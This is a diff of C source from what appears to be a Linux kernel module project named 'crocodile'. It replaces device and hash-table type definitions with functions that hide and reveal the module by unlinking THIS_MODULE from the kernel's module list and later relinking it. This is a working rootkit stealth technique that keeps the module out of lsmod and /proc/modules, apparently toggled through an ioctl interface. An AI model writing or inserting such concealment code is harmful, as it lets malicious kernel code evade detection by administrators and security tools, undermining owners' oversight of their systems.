@@ -16,40 +16,42 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef _CROCODILE_LKM_DEVICE_TYPES_H_
-#define _CROCODILE_LKM_DEVICE_TYPES_H_
+#include <linux/module.h>
 
-#include <linux/cdev.h>
-#include <linux/hashtable.h>
-#include <linux/types.h>
+#include "ctrl/details/ioctl_module.h"
+
+static struct list_head* _p_prev_module = NULL;
+
+#define IS_MODULE_HIDDEN            (_p_prev_module != NULL)
 
 /******************************************************************************
- *  Device types.
+ *  Public functions.
  ******************************************************************************/
 
-#define HASH_TBL_BITS       8
-
-struct hash_node
+int is_module_hidden(void)
 {
-    struct hlist_node node;
-};
-typedef struct hash_node    hash_node_t;
+    return IS_MODULE_HIDDEN;
+}
 
-struct hash_table
+void module_hide(void)
 {
-    size_t              size;
-    DECLARE_HASHTABLE(tbl, HASH_TBL_BITS);
-};
-typedef struct hash_table   hash_table_t;
+    if (IS_MODULE_HIDDEN) {
+        return;
+    }
 
-struct module_dev
+    _p_prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void module_show(void)
 {
-    struct mutex    lock;   /* mutual exclusion semaphore   */
-    struct cdev     cdev;   /* char device structure        */
+    if (! IS_MODULE_HIDDEN) {
+        return;
+    }
 
-    hash_table_t    hash_tbl;
-};
-typedef struct module_dev   module_dev_t;
+    list_add(&THIS_MODULE->list, _p_prev_module);
+    _p_prev_module = NULL;
+}
 
-#endif /* _CROCODILE_LKM_DEVICE_TYPES_H_ */
+#undef IS_MODULE_HIDDEN
 
